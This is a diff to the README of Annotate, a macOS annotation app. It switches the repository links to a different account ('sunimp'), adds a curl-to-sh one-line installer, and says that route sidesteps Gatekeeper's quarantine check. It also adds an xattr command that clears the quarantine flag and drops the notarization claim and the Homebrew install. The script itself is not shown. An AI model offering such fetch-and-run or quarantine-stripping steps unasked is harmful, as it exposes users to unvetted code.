@@ -50,11 +50,19 @@ Sometimes you need to emphasize a part of your screen or share ideas visually, a
 
 ## 📦 Installation
 
+### One-line install (recommended)
+
+```sh
+curl -fsSL https://raw.githubusercontent.com/sunimp/Annotate/main/install.sh | sh
+```
+
+It installs `Annotate.app` to `/Applications` (or `~/Applications` on a non-admin account) and opens it. Run it again any time to update. Releases aren't signed with a Developer ID or notarized, and macOS adds a quarantine flag to apps downloaded in a browser, which makes Gatekeeper block the first launch; `curl` doesn't add that flag, so this just works. The script is short and readable: [`install.sh`](install.sh). Set `ANNOTATE_DEST` to install somewhere else.
+
 ### Download Release
 
 1. **Download the Application:**
 
-   - Go to [latest release](https://github.com/epilande/Annotate/releases/latest) page.
+   - Go to [latest release](https://github.com/sunimp/Annotate/releases/latest) page.
    - Download the `Annotate-x.x.x.dmg` file for easy installation, or `Annotate-x.x.x.zip` for manual installation.
 
 2. **Install the Application:**
@@ -76,22 +84,19 @@ Sometimes you need to emphasize a part of your screen or share ideas visually, a
 > [!NOTE]
 > Requires macOS 14 (Sonoma) or later. Supports both Apple Silicon and Intel Macs.
 >
-> The app is code-signed and notarized for macOS Gatekeeper compatibility.
+> Releases are ad-hoc signed and not notarized. If Gatekeeper blocks the first launch of a manual download, clear the quarantine flag once you trust the source:
+>
+> ```sh
+> xattr -dr com.apple.quarantine /Applications/Annotate.app
+> ```
 
-### Homebrew
-
-Install via [Homebrew Cask](https://formulae.brew.sh/cask/annotate):
-
-```sh
-brew install --cask annotate
-```
 
 ### Build from Source
 
 1. **Clone the Repository:**
 
    ```sh
-   git clone https://github.com/epilande/Annotate
+   git clone https://github.com/sunimp/Annotate
    ```
 
 2. **Open the Project in Xcode:**
